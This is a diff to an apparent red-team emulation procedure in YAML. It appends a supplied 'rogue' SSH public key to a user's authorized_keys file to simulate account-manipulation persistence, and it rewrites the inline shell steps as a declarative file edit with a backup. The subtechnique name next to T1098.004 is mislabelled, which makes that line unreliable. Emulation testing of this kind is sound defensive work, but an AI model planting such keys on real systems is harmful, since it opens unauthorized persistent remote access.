@@ -8,30 +8,24 @@ args:
     default: "${HOME}/.ssh/authorized_keys"
   - name: rogue_key
     description: "The rogue public SSH key to be added"
+    required: true
+requirements:
+  platforms:
+    - os: windows
+    - os: linux
+    - os: darwin
+mitre:
+  tactics:
+    - TA0003 Persistence
+  techniques:
+    - T1098 Account Manipulation
+  subtechniques:
+    - T1098.004 Add or Modify System Process
 
 steps:
-  - name: ensure-authorized_keys-present
-    inline: |
-      set -e
-
-      if [[ ! -f "{{ .Args.ssh_authorized_keys }}" ]]; then
-        echo "Error: no authorized_keys file present at the specified path."
-        exit 1
-      fi
-
-  - name: backup-authorized_keys
-    inline: |
-      set -e
-
-      cp "{{ .Args.ssh_authorized_keys }}" "{{ .Args.ssh_authorized_keys }}.bak"
-
   - name: modify-authorized_keys
-    inline: |
-      set -e
-
-      echo "{{ .Args.rogue_key }}" >> "{{ .Args.ssh_authorized_keys }}"
-    cleanup:
-      inline: |
-        set -e
-
-        mv "{{ .Args.ssh_authorized_keys }}.bak" "{{ .Args.ssh_authorized_keys }}"
+    edit_file: {{ .Args.ssh_authorized_keys }}
+    backup_file: "{{ .Args.ssh_authorized_keys }}.bak"
+    edits:
+      - description: "Add input {{ .Args.rogue_key }} to {{ .Args.ssh_authorized_keys }}"
+        append: "{{ .Args.rogue_key }}"
